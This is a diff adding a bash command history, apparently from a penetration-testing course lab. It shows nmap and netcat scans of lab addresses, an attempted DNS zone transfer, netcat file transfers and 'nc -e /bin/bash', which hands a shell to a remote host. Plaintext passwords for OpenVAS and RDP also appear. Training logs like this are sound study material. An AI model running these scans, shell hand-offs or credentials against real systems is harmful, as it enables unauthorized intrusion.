@@ -1,1 +1,494 @@
-ddd
+    1  ifup wlan0
+    2  ifconfig -a
+    3  cd Downloads/
+    4  ll
+    5  ls
+    6  dpkg -i google-chrome-stable_current_amd64.deb 
+    7  uname -a
+    8  exit
+    9  ifconfig -a
+   10  ping 10.11.1.220
+   11  exit
+   12  cd Downloads/
+   13  ls
+   14  rm google-chrome-stable_current_amd64.deb 
+   15  ls
+   16  bunzip2 lab-connection.tar.bz2 
+   17  ls
+   18  tar -xf lab-connection.tar 
+   19  ls
+   20  openvpn
+   21  ls
+   22  openvpn OS-32218-PWK.ovpn
+   23  exit
+   24  history
+   25  openvpn OS-32218-PWK.ovpn
+   26  ls
+   27  cd Downloads/
+   28  ls
+   29  openvpn OS-32218-PWK.ovpn
+   30  ls
+   31  vim startopenvpnPWK.sh 
+   32  man script
+   33  script startopenvpnPWK.sh 
+   34  LS
+   35  ls
+   36  cat startopenvpnPWK.sh 
+   37  vim startopenvpnPWK.sh 
+   38  clear
+   39  vim startopenvpnPWK.sh 
+   40  ls
+   41  ls -al
+   42  chmod +x startopenvpnPWK.sh 
+   43  ls -al
+   44  rm startopenvpn.sh 
+   45  ./startopenvpnPWK.sh 
+   46  vim startopenvpnPWK.sh 
+   47  rm startopenvpnPWK.sh 
+   48  ll
+   49  ls
+   50  cd
+   51  vim .bash_profile
+   52  ls -al
+   53  vim .bashrc 
+   54  . .bashrc
+   55  ll
+   56  cd scripts/
+   57  ll
+   58  echo > startopenvpnPWK.sh
+   59  openvpn OS-32218-PWK.ovpn
+   60  cp ../Downloads/OS-32218-PWK.ovpn .
+   61  ls
+   62  script startopenvpnPWK.sh
+   63  vim startopenvpnPWK.sh 
+   64  ll
+   65  ls
+   66  ll
+   67  ls -al
+   68  chmod +x startopenvpnPWK.sh 
+   69  ls
+   70  ll
+   71  exit
+   72  ls
+   73  ll
+   74  ls -al
+   75  mkdir scripts
+   76  ls
+   77  cd scripts/
+   78  ls
+   79  script startopenvpn.sh
+   80  ll
+   81  ls
+   82  cd
+   83  ll
+   84  ls
+   85  cd Downloads/
+   86  ls
+   87  ls -al
+   88  vim startopenvpn.sh 
+   89  rm startopenvpn.sh 
+   90  cd ../scripts/
+   91  ./startopenvpnPWK.sh 
+   92  exit
+   93  ls
+   94  cat startopenvpn.sh 
+   95  cd
+   96  cd /
+   97  script Desktop/StartOpenVPN.sh
+   98  cd
+   99  script Desktop/StartOpenVPN.sh
+  100  exit
+  101  cd Desktop/
+  102  ls
+  103  cd ../Downloads/
+  104  ls
+  105  openvpn
+  106  ls
+  107  script startopenvpn.sh
+  108  exit
+  109  cat /etc/shells
+  110  cat /etc/passwd
+  111  cat /etc/shells
+  112  zsh
+  113  screen
+  114  tmux
+  115  echo $-
+  116  exit
+  117  ls
+  118  cd /
+  119  ls
+  120  ls /etc/
+  121  yum update
+  122  apt-get update
+  123  exit
+  124  cd scripts/
+  125  ll
+  126  apt-get update
+  127  apt-get dist-upgrade
+  128  ./startopenvpnPWK.sh 
+  129  apt-get dist-upgrade
+  130  apt-get install openvas
+  131  apt-get remove
+  132  apt autoremove
+  133  netstat -antp
+  134  openvas-start
+  135  openvasmd --user=admin --new-password=RootWeenie123$%^
+  136  service openvas-scanner start
+  137  service openvas-manager start
+  138  service greenbone-security-assistant start
+  139  exit
+  140  ll
+  141  cd scripts
+  142  vim pw.txt
+  143  ./startopenvpnPWK.sh 
+  144  exit
+  145  openvas-start
+  146  service openvassd start
+  147  systemctl openvassd.service start
+  148  systemctl
+  149  systemctl openvas-scanner.service start
+  150  ll
+  151  ll scripts/
+  152  exit
+  153  cd scripts/
+  154  ll
+  155  ./startopenvpnPWK.sh 
+  156  exit
+  157  ll
+  158  cd 
+  159  ll
+  160  cd scripts/
+  161  ll
+  162  exit
+  163  cd scripts/
+  164  ll
+  165  cat pw.txt 
+  166  ./startopenvpnPWK.sh 
+  167  ifconfig
+  168  history
+  169  systemctl
+  170  history
+  171  service openvas-scanner start
+  172  service openvas-manager start
+  173  openvas-start
+  174  systemctl openvassd.service start
+  175  systemctl
+  176  ping 10.11.1.14
+  177  ifconfig
+  178  W7
+  179  ll
+  180  rdesktop -u offsec -p jfpnQMgvAs6 10.11.10.12
+  181  ping 10.11.10.12
+  182  snmpwalk -c public -v1 11.10.11.12
+  183  vim perlsnmp.txt
+  184  snmpwalk -c public -v1 11.10.11.12 1.3.6.1.2.1.25.4.2.1.2
+  185  ping 10.11.10.12
+  186  ping 10.11.1.14
+  187  snmpwalk -c public -v1 11.10.11.12 vmwProductSpecific
+  188  cd scripts/
+  189  ll
+  190  cat pw.txt 
+  191  ./startopenvpnPWK.sh 
+  192  LL
+  193  ll
+  194  rdesktop -u offsec -p jfpnQMgvAs6 10.11.10.12
+  195  cd scripts/
+  196  ll
+  197  ./startopenvpnPWK.sh 
+  198  cat pw.txt 
+  199  ll
+  200  history
+  201  vim w7.sh
+  202  ll
+  203  chmod 755 w7.sh 
+  204  ll
+  205  w7
+  206  ./w7.sh 
+  207  ifconfig
+  208  ll
+  209  cd scripts/
+  210  ./startopenvpnPWK.sh 
+  211  cat pw.txt 
+  212  cat startopenvpnPWK.sh 
+  213  ll
+  214  ./startopenvpnPWK.sh 
+  215  cat pw.txt 
+  216  ifconfig
+  217  shutdown now
+  218  man locate
+  219  updatedb
+  220  locate sdb.exe
+  221  locate sbd.exe
+  222  man which
+  223  which sbd
+  224  sbd -h
+  225  find /-name sbd*
+  226  find / -name sbd*
+  227  find / -name sbd* -exec file{} \;
+  228  find / -name sbd* -exec file {} \;
+  229  file
+  230  file pw.sh
+  231  file w7.sh
+  232  clear
+  233  service ssh start
+  234  netstat |grep sshd
+  235  netstat -antp |grep sshd
+  236  clear
+  237  service apache2 start
+  238  cd /var/www/
+  239  ll
+  240  ls -al
+  241  cd html/
+  242  ll
+  243  echo "This is mine." > index.html 
+  244  service apache2 stop
+  245  /etc/init.sh/ssh start
+  246  /etc/init.d/ssh start
+  247  /etc/init.d/ssh stop
+  248  cd
+  249  update-rc.d ssh enable
+  250  update-rc.d apache2 enable
+  251  rcconf
+  252  locate rcconf
+  253  which rcconf
+  254  sysv-rc-conf
+  255  shell
+  256  mkdir notes
+  257  cd notes/
+  258  wget cisco.com
+  259  ll
+  260  cat index.html 
+  261  cat index.html |grep "href="
+  262  cat index.html |grep "href=" |cut / -f 3 
+  263  cat index.html |grep "href=" |cut "/" -d 3 
+  264  cat index.html |grep "href=" |cut "/" -f 3 
+  265  cat index.html |grep "href=" |cut -d"/" -f3 
+  266  cat index.html |grep "href=" |cut -d"/" -f3 |more
+  267  cat index.html |grep "href=" |cut -d"/" -f3 | grep cisco.com
+  268  cat index.html |grep "href=" |cut -d"/" -f3 | grep "cisco\.com"|cut -d'"' -f1
+  269  cat index.html |grep "href=" |cut -d"/" -f3 | grep "cisco\.com"|cut -d'"' -f1 |sort -u
+  270  grep -o "[A-Za-z0-9_\.-]*\.*cisco.com' index.html |sort -u
+  271  grep -o "[A-Za-z0-9_\.-]*\.*cisco.com' index.html |sort -u
+  272  grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html |sort -u
+  273  man grep -o
+  274  ll
+  275  mv index.html cisco.index.html
+  276  ll
+  277  host cisco.com
+  278  host oracle.com
+  279  host johnlillie.com
+  280  host microsoft.com
+  281  host www.cisco.com |grep "has address" |cut -d " " -f4
+  282  cd ../scripts/
+  283  nano getindex.sh
+  284  ll
+  285  chmod 755 getindex.sh 
+  286  ./getindex.sh 
+  287  cd ../notes/
+  288  ../scripts/getindex.sh 
+  289  ll
+  290  cp cisco.index.html index.html
+  291  ../scripts/getindex.sh 
+  292  uname -a
+  293  ll
+  294  cd scripts/
+  295  ll
+  296  cat pw.txt 
+  297  ./startopenvpnPWK.sh 
+  298  ll
+  299  vim getIndex.sh 
+  300  nano getindex.sh 
+  301  vim getindex.sh 
+  302  expr 45 * 34
+  303  expr 45*34
+  304  expr 3 + 3
+  305  man expr
+  306  cd
+  307  vim .bashrc
+  308  vim .profile 
+  309  ls -al
+  310  vim /etc/profile
+  311  . /etc/profile
+  312  exit
+  313  w7
+  314  ll
+  315  ./w7.sh 
+  316  cat w7.sh 
+  317  rdesktop -u offsec -p jfpnQMgvAs6 10.11.10.12
+  318  ifconfig tap0
+  319  ping 10.11.10.12
+  320  ping 10.11.1.220
+  321  ping 10.11.10.12
+  322  ./w7.sh 
+  323  pwd
+  324  exit
+  325  cat getindex.sh 
+  326  ll
+  327  cp ../notes/index.html .
+  328  ll
+  329  ./getindex.sh 
+  330  cat index.html 
+  331  clear
+  332  ./getindex.sh 
+  333  cat index.html |grep "href="/c/m/en_us/never-better"
+  334  cat index.html |grep "never-better"
+  335  ll
+  336  cat getindex.sh 
+  337  nano getIndex.sh
+  338  ll
+  339  chmod 755 getIndex.sh 
+  340  ./getIndex.sh 
+  341  man sort
+  342  ./getindex.sh 
+  343  ./getIndex.sh 
+  344  ll
+  345  ./getindex.sh 
+  346  cat index.html |grep "href=" |cut -d"/" -f3 | grep "cisco\.com"|cut -d'"' -f1 |sort -u
+  347  history
+  348  host www.cisco.com |grep "has address" |cut -d " " -f4
+  349  host cisco.com
+  350  host www.cisco.com
+  351  man ping
+  352  ping -c 3 10.11.10.12
+  353  nano ping-loop.sh
+  354  chmod 755 ping-loop.sh 
+  355  ./ping-loop.sh 
+  356  nano ping-loop.sh
+  357  ./ping-loop.sh 
+  358  ping 10.11.10.12
+  359  nano ping-loop.sh
+  360  ./ping-loop.sh 
+  361  nano ping-loop.sh
+  362  ./ping-loop.sh 
+  363  nano ping-loop.sh
+  364  ./ping-loop.sh 
+  365  nano ping-loop.sh 
+  366  clear
+  367  nano ping-loop.sh 
+  368  ./ping-loop.sh 
+  369  nano ping-loop.sh 
+  370  nc -nv 10.11.10.12 25
+  371  nc -nv 10.11.10.12 110
+  372  nc -nv 10.11.10.12 143
+  373  exit
+  374  nc -nv 10.11.10.12 4444
+  375  ping w7
+  376  ping 10.11.10.12
+  377  ping -c 10.11.10.12
+  378  ping -c1 10.11.10.12
+  379  nc -nv -w 1 -z 10.11.10.12 3385-3390
+  380  nc -h
+  381  nc -nv -w 1 -z 10.11.10.12 4400-4450
+  382  clear
+  383  nc -nv -w 1 -z 10.11.10.12 1370
+  384  nc -nv 10.11.10.12 1370
+  385  nc -nlvp 1370 > incoming.exe
+  386  locate wget.exe
+  387  nc -nv 10.11.10.12 1370 </usr/share/windows-binaries/wget.exe
+  388  nc -vn 10.11.10.12 1370
+  389  nc -vn 10.11.10.12 1370 -e /bin/bash
+  390  clear
+  391  ifconfig
+  392  ls scripts/
+  393  startopenvpnPWK.sh
+  394  cd scripts/
+  395  startopenvpnPWK.sh
+  396  cat pw.txt 
+  397  w7.sh 
+  398  cd scripts/
+  399  ll
+  400  exit
+  401  cd /media/cdrom
+  402  ll
+  403  cd ..
+  404  ll
+  405  cd
+  406  ll
+  407  cd /
+  408  ll
+  409  cd 
+  410  cd scripts/
+  411  nano /usr/share/wireshark/init.lua 
+  412  ifconfig
+  413  apt-get update
+  414  exit
+  415  date
+  416  date Tue Oct 17 12:18:37 MST 2017
+  417  man date
+  418  date 10172017
+  419  man date
+  420  date 101713222017
+  421  ping 10.11.1.7
+  422  host 10.11.1.7
+  423  ss
+  424  netstat
+  425  ping 10.11.1.7
+  426  clear
+  427  ll
+  428  chmod +x forward.sh 
+  429  forward.sh 
+  430  ll
+  431  vim reverse.sh
+  432  cat reverse.sh 
+  433  reverse.sh
+  434  ll
+  435  chmod +x reverse.sh 
+  436  reverse.sh
+  437  cat reverse.sh 
+  438  host 38.100.193.72
+  439  host -t ns megacorpone.com
+  440  host -l megacorpone.com ns2.megacorpone.com
+  441  vim zoneTransferline.sh
+  442  chmod +x zoneTransferline.sh 
+  443  zoneTransferline.sh 
+  444  #!/bin/bash
+  445  for server in $(host -t ns megacorpone.com | cut -d" " -f4); do host -l megacorpone.com $server;done
+  446  ll
+  447  clear
+  448  ll
+  449  nc -nvv -w 1 -z 10.11.10.12 3385-3390
+  450  vim iptables-counter.sh
+  451  iptables
+  452  chmod +x iptables-counter.sh 
+  453  iptables-counter.sh 
+  454  vim iptables-counter.sh
+  455  nmap 10.11.10.12
+  456  iptables-counter.sh 
+  457  nmap 10.11.10.12
+  458  iptables -vn -L
+  459  nmap -sn w7
+  460  vim /etc/hosts
+  461  nmap -sn w7
+  462  nmap 10.11.10.12
+  463  nmap -p 80 10.11.10.12 -oG websweep.txt
+  464  ll
+  465  cat websweep.txt 
+  466  ll /usr/share/nmap/scripts/ > /root/notes/nmap-nse-scripts.txt
+  467  rev nmap-nse-scripts.txt |cut -d " " -f1 > rev-nmap.txt
+  468  rev rev-nmap.txt > rev2-nmap.txt
+  469  ll
+  470  nmap -sn 10.11.1.7 -oG
+  471  nmap -sn 10.11.1.7
+  472  man nmap
+  473  nmap -sT --tcp-ports 10 10.11.1.7
+  474  nmap -sT --tcp-ports 20 10.11.1.7
+  475  nmap -sT --tcp-ports 20 10.11.1.7-10
+  476  nmap -sT --tcp-ports 20 10.11.1.7-10 -oG top-port-sweep.txt
+  477  nmap -sT --top-ports 20 10.11.1.7-10 -oG top-port-sweep.txt
+  478  iptables-counter.sh 
+  479  nmap -A 10.11.10.12
+  480  nmap -A 10.11.1.7
+  481  iptables -vn -L
+  482  ls /usr/share/nmap/
+  483  ls /usr/share/nmap/scripts/
+  484  cd /usr/share/nmap/scripts/
+  485  ll
+  486  ls -a
+  487  ls -a /root/notes/nseScripts.txt
+  488  ls -a > /root/notes/nseScripts.txt
+  489  nmap -p139,445 w7 --open
+  490  nmap -p139,445 10.11.1.7 --open
+  491  nmap -p139,445 10.11.1.7-20 --open
+  492  history
+  493  cd
+  494  history > histCommands.txt
